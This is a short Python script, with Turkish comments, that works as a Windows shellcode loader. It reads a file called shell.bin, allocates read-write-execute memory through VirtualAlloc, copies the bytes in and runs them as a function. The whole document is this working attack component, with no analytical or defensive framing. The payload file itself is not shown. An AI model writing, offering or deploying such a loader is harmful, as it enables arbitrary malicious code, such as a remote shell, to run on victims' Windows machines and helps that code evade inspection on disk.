import ctypes
import os

# Bellek ayırma ve izinler için gerekli sabitler
PAGE_EXECUTE_READWRITE = 0x40
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000

# Betiğin bulunduğu dizini al
script_dir = os.path.dirname(os.path.abspath(__file__))

# shell.bin dosyasının tam yolunu oluştur
shellcode_path = os.path.join(script_dir, "shell.bin")

# shell.bin dosyasını oku ve binary veriyi al
with open(shellcode_path, "rb") as f:
    shellcode = f.read()

# Bellek ayırma ve shellcode'u yazma
ptr = ctypes.windll.kernel32.VirtualAlloc(None, len(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
ctypes.memmove(ptr, shellcode, len(shellcode))

# Shellcode'u çalıştırma
shellcode_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
shellcode_func()
